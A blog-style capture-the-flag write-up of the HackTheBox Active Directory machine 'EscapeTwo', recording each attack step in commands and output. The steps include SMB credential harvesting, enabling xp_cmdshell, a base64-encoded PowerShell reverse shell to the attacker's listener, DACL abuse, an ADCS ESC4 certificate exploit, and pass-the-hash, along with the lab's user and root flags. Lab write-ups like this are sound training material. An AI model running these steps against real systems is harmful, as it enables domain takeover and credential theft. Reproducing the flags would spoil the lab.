---
layout: post
title: "HTB AD Easy: EscapeTwo"
description: "EscapeTwo is an Easy rated AD machine on HTB."
categories: [CTF,HTB]
tags: [AD,Easy]
author: g
---

## Nmap Scan
```bash
Nmap scan report for sequel.htb (10.10.11.51)
Host is up (0.020s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-17 08:30:48Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-01-17T08:32:22+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-01-17T08:32:22+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2025-01-17T08:32:22+00:00; 0s from scanner time.
| ms-sql-info: 
|   10.10.11.51:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-01-17T04:34:41
|_Not valid after:  2055-01-17T04:34:41
| ms-sql-ntlm-info: 
|   10.10.11.51:1433: 
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-01-17T08:32:22+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-01-17T08:32:22+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49686/tcp open  msrpc         Microsoft Windows RPC
49687/tcp open  msrpc         Microsoft Windows RPC
49702/tcp open  msrpc         Microsoft Windows RPC
49718/tcp open  msrpc         Microsoft Windows RPC
49739/tcp open  msrpc         Microsoft Windows RPC
49804/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-01-17T08:31:45
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 101.45 seconds
```

Modify hosts file:
```bash
tail -n 1 /etc/hosts      
10.10.11.51 sequel.htb
```


### Assumed breach
```
rose:KxEPkKe6R8su
```


### Enumerate SMB (Port 445)
Shares open:
![Pasted image 20250117094057.png](/images/Pasted image 20250117094057.png){: .normal }


Grab the files:
```bash
smbclient "\\\\10.10.11.51\\Accounting Department" -U sequel/rose                               
Password for [SEQUEL\rose]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jun  9 12:52:21 2024
  ..                                  D        0  Sun Jun  9 12:52:21 2024
  accounting_2024.xlsx                A    10217  Sun Jun  9 12:14:49 2024
  accounts.xlsx                       A     6780  Sun Jun  9 12:52:07 2024

                6367231 blocks of size 4096. 918945 blocks available
smb: \> mget *
Get file accounting_2024.xlsx? y
getting file \accounting_2024.xlsx of size 10217 as accounting_2024.xlsx (131.3 KiloBytes/sec) (average 131.3 KiloBytes/sec)
Get file accounts.xlsx? y
getting file \accounts.xlsx of size 6780 as accounts.xlsx (84.9 KiloBytes/sec) (average 107.8 KiloBytes/sec)
```

Since we couldn't open the xlsx files directly, we can instead decompress them and analyze the XML documents manually. In the sharedStrings.xml file we end up finding credentials!
```bash
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="25" uniqueCount="24">
  <si>
    <t xml:space="preserve">angela@sequel.htb</t>
  </si>
  <si>
    <t xml:space="preserve">0fwz7Q4mSpurIt99</t>
  </si>
  <si>
    <t xml:space="preserve">oscar@sequel.htb</t>
  </si>
  <si>
    <t xml:space="preserve">86LxLBMgEWaKUnBG</t>
  </si>
  <si>
    <t xml:space="preserve">kevin@sequel.htb</t>
  </si>
  <si>
    <t xml:space="preserve">Md9Wlq1E5bZnVDVo</t>
  </si>
  <si>
    <t xml:space="preserve">sa@sequel.htb</t>
  </si>
  <si>
    <t xml:space="preserve">MSSQLP@ssw0rd!</t>
  </si>
</sst>
```

Valid:
```bash
oscar:86LxLBMgEWaKUnBG
sa:MSSQLP@ssw0rd!
```

We can authenticate to the MSSQL server using the sa user's credentials:
```bash
impacket-mssqlclient sequel.htb/sa@sequel.htb              
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (sa  dbo@master)> 
```

Xp_cmdshell can be enabled:
![Pasted image 20250117100804.png](/images/Pasted image 20250117100804.png){: .normal }

Obtain a shell to the system:
```bash
EXECUTE xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANAAwACIALAA4ADAAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'

# Shell
nc -lnvp 80
listening on [any] 80 ...
connect to [10.10.14.40] from (UNKNOWN) [10.10.11.51] 57079

PS C:\Windows\system32> whoami
sequel\sql_svc
```

Found a password on the filesystem:
```bash
PS C:\SQL2019\ExpressAdv_ENU> type sql-Configuration.INI
[OPTIONS]
ACTION="Install"
QUIET="True"
FEATURES=SQL
INSTANCENAME="SQLEXPRESS"
INSTANCEID="SQLEXPRESS"
RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"
AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"
AGTSVCSTARTUPTYPE="Manual"
COMMFABRICPORT="0"
COMMFABRICNETWORKLEVEL=""0"
COMMFABRICENCRYPTION="0"
MATRIXCMBRICKCOMMPORT="0"
SQLSVCSTARTUPTYPE="Automatic"
FILESTREAMLEVEL="0"
ENABLERANU="False" 
SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
SQLSVCACCOUNT="SEQUEL\sql_svc"
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
SQLSYSADMINACCOUNTS="SEQUEL\Administrator"
SECURITYMODE="SQL"
SAPWD="MSSQLP@ssw0rd!"
ADDCURRENTUSERASSQLADMIN="False"
TCPENABLED="1"
NPENABLED="1"
BROWSERSVCSTARTUPTYPE="Automatic"
IAcceptSQLServerLicenseTerms=True
```

This password works for the ryan user:
```bash
evil-winrm -i 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3 
Evil-WinRM shell v3.7
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\ryan\Documents> whoami
sequel\ryan
```

Found user.txt: `5b81917715c44539ef42b8ebb8eedf03`
```bash
*Evil-WinRM* PS C:\Users\ryan\Desktop> type user.txt
5b81917715c44539ef42b8ebb8eedf03
```


### Lateral movement
In BloodHound we see that the ryan user owns the ca_svc user:
![Pasted image 20250117103900.png](/images/Pasted image 20250117103900.png){: .normal }


Abuse WriteDACL:
```bash
impacket-owneredit -action write -new-owner 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'
[*] Current owner information below
[*] - SID: S-1-5-21-548670397-972687484-3496335370-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=sequel,DC=htb
[*] OwnerSid modified successfully!

impacket-dacledit -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'  
[*] DACL backed up to dacledit-20250117-110125.bak
[*] DACL modified successfully!
```

We can now change the password of the ca_svc user:
```bash
net rpc password "ca_svc" 'Password123!' -U "sequel.htb"/"ryan"%"WqSZAF6CysDQbGb3" -S "10.10.11.51"  
```


### Privilege Escalation
We can assume that the ca_svc user has permissions over certain certificate authorities. Certs can be requested by using certipy-ad in Kali. In this case we are looking for vulnerable certs:
```bash
certipy-ad find -u 'ca_svc' -p 'Password123!' -dc-ip 10.10.11.51 -vulnerable -enabled -debug            
Certipy v4.8.2 - by Oliver Lyak (ly4k)
--SNIP--
[*] Saved text output to '20250117110917_Certipy.txt'
[*] Saved JSON output to '20250117110917_Certipy.json'
```

Reviewing the output we find a vulnerable cert:
```bash
Certificate Templates
  0
    Template Name                       : DunderMifflinAuthentication
    Display Name                        : Dunder Mifflin Authentication
[!] Vulnerabilities
ESC4: 'SEQUEL.HTB\\Cert Publishers' has dangerous permissions
```

Using the following guide we are able to exploit the ESC4 vulnerability: [Link](https://www.thehacker.recipes/ad/movement/adcs/access-controls#certificate-templates-esc4).
```bash
certipy-ad template -u "ca_svc@sequel.htb" -p 'Password123!' -dc-ip "10.10.11.51" -template DunderMifflinAuthentication -save-old
Certipy v4.8.2 - by Oliver Lyak (ly4k)
[*] Saved old configuration for 'DunderMifflinAuthentication' to 'DunderMifflinAuthentication.json'
[*] Updating certificate template 'DunderMifflinAuthentication'
[*] Successfully updated 'DunderMifflinAuthentication'

certipy-ad req -u "ca_svc@sequel.htb" -p 'Password123!' -dc-ip "10.10.11.51" -target "10.10.11.51" -ca 'sequel-DC01-CA' -template 'DunderMifflinAuthentication' -upn 'Administrator'
Certipy v4.8.2 - by Oliver Lyak (ly4k)
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 20
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

This .pfx file can be used to get the NTLM hash of the Administrator user:
```bash
python3 gettgtpkinit.py -cert-pfx administrator.pfx sequel.htb/Administrator user.ccache -dc-ip 10.10.11.51
2025-01-17 11:19:05,649 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-01-17 11:19:05,728 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2025-01-17 11:19:05,784 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-01-17 11:19:05,785 minikerberos INFO     c3d963501e0f658edc7f1c930f3c1449492ed79c2ecb4cd155e5176ca2e4c27a
INFO:minikerberos:c3d963501e0f658edc7f1c930f3c1449492ed79c2ecb4cd155e5176ca2e4c27a
2025-01-17 11:19:05,788 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file

export KRB5CCNAME=user.ccache

python3 getnthash.py -key c3d963501e0f658edc7f1c930f3c1449492ed79c2ecb4cd155e5176ca2e4c27a sequel.htb/Administrator -dc-ip 10.10.11.51
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
7a8d4e04986afa8ed4060f75e5a0b3ff
```

Pass the hash using evil-winrm:
```bash
evil-winrm -i 10.10.11.51 -u Administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff
Evil-WinRM shell v3.7
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
sequel\administrator
```

Root.txt: `a7eb81022f9dd098a5f0210d74bde865`
```bash
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
a7eb81022f9dd098a5f0210d74bde865
```

Proof of exploitation:
![Pasted image 20250117112236.png](/images/Pasted image 20250117112236.png){: .normal }


### PWNED!!!
![Pasted image 20250117112157.png](/images/Pasted image 20250117112157.png){: .normal }